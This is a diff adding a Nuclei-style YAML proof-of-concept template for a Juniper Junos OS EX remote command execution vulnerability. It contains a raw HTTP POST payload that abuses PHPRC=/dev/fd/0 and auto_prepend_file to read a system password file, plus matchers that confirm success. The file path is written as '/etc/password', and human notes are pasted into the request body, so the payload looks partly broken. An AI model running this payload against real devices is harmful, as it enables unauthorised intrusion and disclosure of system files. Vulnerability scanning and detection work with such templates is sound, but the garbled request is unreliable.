@@ -1,0 +1,48 @@
+id: poc-fk49424n61txbq2z
+info:
+  name: Juniper Networks Junos OS EX远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fk49424n61txbq2z'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fk49424n61txbq2z
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /?PHPRC=/dev/fd/0 HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+
+
+
+    auto_prepend_file="/etc/password"
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
